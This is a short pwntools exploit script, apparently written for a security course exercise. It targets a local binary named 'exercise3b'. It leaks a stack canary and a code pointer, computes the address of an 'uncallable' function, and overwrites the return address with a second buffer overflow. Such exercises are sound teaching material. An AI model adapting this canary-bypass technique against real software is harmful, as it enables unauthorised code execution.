#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break * check_authorization +141
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()
e = ELF(exe)

r.recvline()
r.sendline(175*b'A')
r.recvline()

x = r.recvline()
canary = x[:4]
print_hello_fn = x[4:10]
uncallable = int.from_bytes(print_hello_fn, 'little') - e.symbols['print_hello'] + e.symbols['uncallable']
print(hex(uncallable))
r.recvline()
r.recvline()
r.sendline(176*b'A' + p32(u32(canary)) + 36*b'A' + p64(uncallable))
print(r.recvall(3))

